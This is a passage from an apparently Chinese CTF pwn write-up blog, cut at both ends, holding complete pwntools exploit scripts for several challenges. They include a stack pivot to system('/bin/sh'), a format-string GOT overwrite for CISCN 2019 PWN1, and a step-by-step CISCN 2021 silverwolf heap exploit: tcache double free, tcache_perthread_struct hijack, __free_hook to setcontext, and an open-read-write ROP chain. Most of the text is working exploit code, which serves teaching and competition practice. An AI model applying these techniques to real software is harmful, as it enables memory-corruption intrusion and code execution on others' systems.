获取shell</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;1.14.71.254&quot;,28294)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">stack_addr = u32(io.recvuntil(<span class="string">&quot;\xff&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">success(<span class="string">&quot;stack_addr :&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">system_addr = <span class="number">0x8048400</span></span><br><span class="line">s_addr = stack_addr - (<span class="number">0xff976728</span>-<span class="number">0xff9766f0</span>)</span><br><span class="line">binsh_addr = s_addr + <span class="number">0xc</span></span><br><span class="line">leave_addr = <span class="number">0x080484b8</span></span><br><span class="line">payload = p32(system_addr)+p32(<span class="number">0</span>)+p32(binsh_addr)+<span class="string">b&#x27;/bin/sh;&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>)+p32(s_addr-<span class="number">0x4</span>)+p32(leave_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x80485FE&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="CISCN-2019西南-PWN1"><a href="#CISCN-2019西南-PWN1" class="headerlink" title="[CISCN 2019西南]PWN1"></a>[CISCN 2019西南]PWN1</h2><p>解析放到栈分类的手写格式化字符串漏洞中了 下面直接放exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28417</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">fini_addr = <span class="number">0x804979C</span></span><br><span class="line">main_addr = <span class="number">0x8048534</span></span><br><span class="line">printf_got = <span class="number">0x804989c</span></span><br><span class="line">system_addr = <span class="number">0x80483d0</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x0804</span>).encode()+<span class="string">b&#x27;c%15$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%16$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x83d0</span>-<span class="number">0x0804</span>).encode()+<span class="string">b&#x27;c%17$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x8534</span>-<span class="number">0x83d0</span>).encode()+<span class="string">b&#x27;c%18$hnaa&#x27;</span></span><br><span class="line">payload += p32(fini_addr+<span class="number">2</span>)</span><br><span class="line">payload += p32(printf_got+<span class="number">2</span>)</span><br><span class="line">payload += p32(printf_got)</span><br><span class="line">payload += p32(fini_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="CISCN-2021-初赛-silverwolf"><a href="#CISCN-2021-初赛-silverwolf" class="headerlink" title="[CISCN 2021 初赛]silverwolf"></a>[CISCN 2021 初赛]silverwolf</h2><p>这题不是很难 但是难点在于多个知识点的结合</p><p>在复现的时候也是学习到了许多新知识 下面详细复现一遍</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303222047574.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303222047574.png" alt="image.png"></a></p><p>保护全开  同时libc文件是比较少见的2.27 1.3的小版本 这个版本也和目前最新的1.6版本一样  对于tcache有了新的检查机制</p><p>ida看一下几个函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3[<span class="number">5</span>]; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_C70();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. allocate&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. edit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. show&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. exit&quot;</span>);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Your choice: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(&amp;unk_1144, v3);</span><br><span class="line">    <span class="keyword">switch</span> ( v3[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Unknown&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>乍看一下漏洞给的挺多 好像是很简单的堆模板题</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303161809825.png" title="image-20230316180906699" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303161809825.png" alt="image-20230316180906699"></a></p><p>但是还开启了沙盒 那显然是无法获取shell了 那就只能想办法构造rop链 </p><p>同时仔细观察一下 你还会发现 其用来存储chunk指针的不是数组而是单子长的一个指针 这就意味着我们只能操控最新申请的一个chunk</p><p>我们拥有的漏洞点包含 UAF off_by_null</p><p>既然给了show函数 那么这时候想要泄露基址 还是通过Unsortedbin 不过由于对于申请chunk大小的限制 同时还有指针问题 所以这里要想把chunk丢到unsortedbin中只能通过篡改tcache_perthread_struct来实现目的了 </p><p>另外 还有一个问题 由于开启了沙盒 沙盒的调用本身也是需要内存空间的 所以程序会自带一些chunk</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303162044138.png" title="image-20230316204452016" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303162044138.png" alt="image-20230316204452016"></a></p><p>不过这些chunk对于我们的利用不会起到太大的影响 在做题的过程中小心一下即可</p><p>为了劫持tcache_perthread_struct 我们首要的目的就是泄露堆地址 </p><p>既然有UAF 那么我这里选择的办法是double free 然后泄露fd的值 计算堆基址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_addr = (u64(io.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop = <span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) &gt;&gt; <span class="number">12</span>) * (<span class="number">0x1000</span>)-<span class="number">0x1000</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure><p>接下来顺带利用好这个double free 来申请到tcache_perthread_struct的地址 然后更改一下counts数组 </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">0</span>,p64(heap_addr+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x7000000</span>))</span><br></pre></td></tr></table></figure><p>这里的*<em>p64(0)<em>4+p64(0x7000000))</em></em>  我还是提一嘴</p><p>这样修改counts 你会发现被改为7的是0x250链表的位置</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303162059354.png" title="image-20230316205924268" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303162059354.png" alt="image-20230316205924268"></a></p><p>之所以是0x250 是因为实际上此时的指针指向的chunk 虽然我们是通过0x28申请到的chunk 但是chunk头的0x251并没有被改写</p><p>接下来就是释放chunk进unsortedbin 随后获得一些下面要用到的地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;main_arena_addr :&quot;</span>+<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_addr = main_arena_addr - (<span class="number">0x7f98511ebca0</span>-<span class="number">0x7f9850e00000</span>)</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">setcontext = libc_addr + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br></pre></td></tr></table></figure><p>setcontext就是我们接下来要构造orw的关键好戏了 </p><p>你可以在libc文件中找到这一函数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303162103405.png" title="image-20230316210338312" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303162103405.png" alt="image-20230316210338312"></a></p><p>可以看到函数对各种寄存器的值都进行了操作 并且还有一次push rcx的入栈操作 特别是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000521B5                 mov     rsp, [rdi+0A0h]</span><br></pre></td></tr></table></figure><p>对于rsp寄存器的劫持可以使得我们在堆上构造rop链 随后迁移过去 因为其赋值是根据rdi来的</p><p>rdi寄存器的值要怎么由我们操控呢? 当然是free函数了 </p><p>进行一个小实验 编写如下程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *a[<span class="number">50</span>];</span><br><span class="line">  *a = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">  <span class="built_in">free</span>(*a);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303162212250.png" title="image-20230316221220111" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303162212250.png" alt="image-20230316221220111"></a></p><p>可以看到此时执行free函数时 rdi寄存器指向的就是chunk的地址</p><p>控制rdi寄存器的办法有了 接下来来安排下tcache_perthread_struct的布置问题 我们需要修改entry数组 来得到多次任意地址申请的机会</p><p>在开始布置之前 我们需要先获得能修改到其的机会 由于我们最开始使用的是0x28字节的chunk 显然是不够修改到entry数组的长度 </p><p>我们挑选一个还没有存放chunk的tcachebin链表 会向unsortedbin中申请 所以此时申请到的地址还是tcache_perthread_struct中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">8</span>+p64(heap_addr+<span class="number">0x50</span>))</span><br></pre></td></tr></table></figure><p>于是我们获得了修改entry数组的机会 我们将0x20链表的修改为heap_addr+0x50 这个地址指向的就是entry数组的首地址</p><p>随后我们利用这个机会 修改0x40链表的entry 这样就可以修改到更大链表的机会</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(heap_addr+<span class="number">0x50</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">payload = p64(free_hook)+p64(heap_addr+<span class="number">0x1000</span>)+p64(heap_addr+<span class="number">0x1000</span>+<span class="number">0xa0</span>)   <span class="comment">#0x20 0x30 0x40</span></span><br><span class="line">payload += p64(heap_addr+<span class="number">0x1000</span>)+p64(heap_addr+<span class="number">0x2000</span>)+p64(<span class="number">0</span>)+p64(heap_addr+<span class="number">0x2000</span>+<span class="number">0x58</span>) <span class="comment">#0x50 0x60 0x70 0x80</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure><p>这里的entry构造就要详细讲讲了</p><p>我们需要把rop链写到堆上 不过由于对申请堆块的限制 所以就只能分两次写 对应着0x60和0x80的链表</p><p>0x20的链表则用来修改free_hook 使其指向setcontext+53的地址</p><p>0x30和0x40的链表我们要用来配合劫持rsp指针 使其迁移到堆上的rop链</p><p>0x50的链表则是用来触发free 充当rdi寄存器值</p><p>0x70没有作用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ret_addr = libc_addr + <span class="number">0x00000000000008aa</span></span><br><span class="line">rdi_addr = libc_addr + <span class="number">0x000000000002164f</span></span><br><span class="line">rsi_addr = libc_addr + <span class="number">0x0000000000023a6a</span></span><br><span class="line">rdx_addr = libc_addr + <span class="number">0x0000000000001b96</span></span><br><span class="line">rax_addr = libc_addr + <span class="number">0x000000000001b500</span></span><br><span class="line">syscall = libc_addr + libc.sym[<span class="string">&#x27;alarm&#x27;</span>]+<span class="number">0x5</span></span><br><span class="line"><span class="comment"># ret_addr = libc_addr + 0x0000000000023eeb</span></span><br><span class="line"><span class="comment"># rdi_addr = libc_addr + 0x00000000000215bf</span></span><br><span class="line"><span class="comment"># rsi_addr = libc_addr + 0x0000000000023eea</span></span><br><span class="line"><span class="comment"># rdx_addr = libc_addr + 0x0000000000001b96</span></span><br><span class="line"><span class="comment"># rax_addr = libc_addr + 0x0000000000043ae8</span></span><br><span class="line"><span class="comment"># syscall = libc_addr + libc.sym[&#x27;alarm&#x27;]+0x5</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)<span class="comment">#修改free_hook</span></span><br><span class="line">edit(<span class="number">0</span>,p64(setcontext))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)<span class="comment">#设置rdi 顺便用来放./flag字符串</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;./flag\x00\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)<span class="comment">#劫持rsp指针</span></span><br><span class="line">edit(<span class="number">0</span>,p64(heap_addr+<span class="number">0x2000</span>)+p64(ret_addr))</span><br></pre></td></tr></table></figure><p>劫持rsp指针的payload这里就不解释了 可以看我相关博客</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#open</span></span><br><span class="line">flag_addr = heap_addr + <span class="number">0x1000</span></span><br><span class="line">rop_open = p64(rdi_addr)+p64(flag_addr)</span><br><span class="line">rop_open += p64(rsi_addr)+p64(<span class="number">0</span>)</span><br><span class="line">rop_open += p64(rax_addr)+p64(<span class="number">2</span>)</span><br><span class="line">rop_open += p64(syscall)</span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">rop_read = p64(rdi_addr)+p64(<span class="number">3</span>)</span><br><span class="line">rop_read += p64(rsi_addr)+p64(flag_addr)</span><br><span class="line">rop_read += p64(rdx_addr)+p64(<span class="number">0x30</span>)</span><br><span class="line">rop_read += p64(rax_addr)+p64(<span class="number">0</span>)</span><br><span class="line">rop_read += p64(syscall)</span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">rop_write = p64(rdi_addr)+p64(<span class="number">1</span>)</span><br><span class="line">rop_write += p64(rsi_addr)+p64(flag_addr)</span><br><span class="line">rop_write += p64(rdx_addr)+p64(<span class="number">0x30</span>)</span><br><span class="line">rop_write += p64(rax_addr)+p64(<span class="number">1</span>)</span><br><span class="line">rop_write += p64(syscall)</span><br><span class="line">payload = rop_open+rop_read+rop_write</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x58</span>) <span class="comment">#布置rop链</span></span><br><span class="line">edit(<span class="number">0</span>,payload[:<span class="number">0x58</span>])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>) <span class="comment">#布置rop链</span></span><br><span class="line">edit(<span class="number">0</span>,payload[<span class="number">0x58</span>:])</span><br></pre></td></tr></table></figure><p>接着就是布置rop链了 分两次部署 [:0x58]和[0x58:]就是取前后0x58字节的部分 这个python语法问题 没啥好说的</p><p>最后就是释放0x50链表的chunk了 成功获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *&#x27;+str(heap_addr+0x2000))</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;1.14.71.254&quot;,28068)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./刷题/libc-2.27.so&quot;)</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_addr = (u64(io.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop = <span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) &gt;&gt; <span class="number">12</span>) * (<span class="number">0x1000</span>)-<span class="number">0x1000</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_addr+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x7000000</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;main_arena_addr :&quot;</span>+<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_addr = main_arena_addr - (<span class="number">0x7f98511ebca0</span>-<span class="number">0x7f9850e00000</span>)</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">setcontext = libc_addr + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">8</span>+p64(heap_addr+<span class="number">0x50</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(heap_addr+<span class="number">0x50</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">payload = p64(free_hook)+p64(heap_addr+<span class="number">0x1000</span>)+p64(heap_addr+<span class="number">0x1000</span>+<span class="number">0xa0</span>)   <span class="comment">#0x20 0x30 0x40</span></span><br><span class="line">payload += p64(heap_addr+<span class="number">0x1000</span>)+p64(heap_addr+<span class="number">0x2000</span>)+p64(<span class="number">0</span>)+p64(heap_addr+<span class="number">0x2000</span>+<span class="number">0x58</span>) <span class="comment">#0x50 0x60 0x70 0x80</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">ret_addr = libc_addr + <span class="number">0x00000000000008aa</span></span><br><span class="line">rdi_addr = libc_addr + <span class="number">0x000000000002164f</span></span><br><span class="line">rsi_addr = libc_addr + <span class="number">0x0000000000023a6a</span></span><br><span class="line">rdx_addr = libc_addr + <span class="number">0x0000000000001b96</span></span><br><span class="line">rax_addr = libc_addr + <span class="number">0x000000000001b500</span></span><br><span class="line">syscall = libc_addr + libc.sym[<span class="string">&#x27;alarm&#x27;</span>]+<span class="number">0x5</span></span><br><span class="line"><span class="comment"># ret_addr = libc_addr + 0x0000000000023eeb</span></span><br><span class="line"><span class="comment"># rdi_addr = libc_addr + 0x00000000000215bf</span></span><br><span class="line"><span class="comment"># rsi_addr = libc_addr + 0x0000000000023eea</span></span><br><span class="line"><span class="comment"># rdx_addr = libc_addr + 0x0000000000001b96</span></span><br><span class="line"><span class="comment"># rax_addr = libc_addr + 0x0000000000043ae8</span></span><br><span class="line"><span class="comment"># syscall = libc_addr + libc.sym[&#x27;alarm&#x27;]+0x5</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)<span class="comment">#修改free_hook</span></span><br><span class="line">edit(<span class="number">0</span>,p64(setcontext))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)<span class="comment">#设置rdi 顺便用来放./flag字符串</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;./flag\x00\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)<span class="comment">#劫持rsp指针</span></span><br><span class="line">edit(<span class="number">0</span>,p64(heap_addr+<span class="number">0x2000</span>)+p64(ret_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#open</span></span><br><span class="line">flag_addr = heap_addr + <span class="number">0x1000</span></span><br><span class="line">rop_open = p64(rdi_addr)+p64(flag_addr)</span><br><span class="line">rop_open += p64(rsi_addr)+p64(<span class="number">0</span>)</span><br><span class="line">rop_open += p64(rax_addr)+p64(<span class="number">2</span>)</span><br><span class="line">rop_open += p64(syscall)</span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">rop_read = p64(rdi_addr)+p64(<span class="number">3</span>)</span><br><span class="line">rop_read += p64(rsi_addr)+p64(flag_addr)</span><br><span class="line">rop_read += p64(rdx_addr)+p64(<span class="number">0x30</span>)</span><br><span class="line">rop_read += p64(rax_addr)+p64(<span class="number">0</span>)</span><br><span class="line">rop_read += p64(syscall)</span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">rop_write = p64(rdi_addr)+p64(<span class="number">1</span>)</span><br><span class="line">rop_write += p64(rsi_addr)+p64(flag_addr)</span><br><span class="line">rop_write += p64(rdx_addr)+p64(<span class="number">0x30</span>)</span><br><span class="line">rop_write += p64(rax_addr)+p64(<span class="number">1</span>)</span><br><span class="line">rop_write += p64(syscall)</span><br><span class="line">payload = 